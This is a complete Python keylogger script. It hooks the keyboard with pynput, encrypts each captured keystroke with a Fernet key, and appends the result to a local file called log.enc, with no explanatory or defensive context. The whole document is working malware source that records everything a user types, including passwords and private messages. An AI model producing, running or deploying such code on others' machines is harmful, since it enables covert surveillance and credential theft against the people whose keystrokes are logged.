from pynput.keyboard import Listener
from cryptography.fernet import Fernet

# Generate a key (Do this once and save it)
key = Fernet.generate_key()
cipher = Fernet(key)

def log_keystroke(key):
    key = str(key).replace("'", "")
    encrypted_data = cipher.encrypt(key.encode())

    with open("log.enc", "ab") as log_file:
        log_file.write(encrypted_data + b"\n")

with Listener(on_press=log_keystroke) as listener:
    listener.join()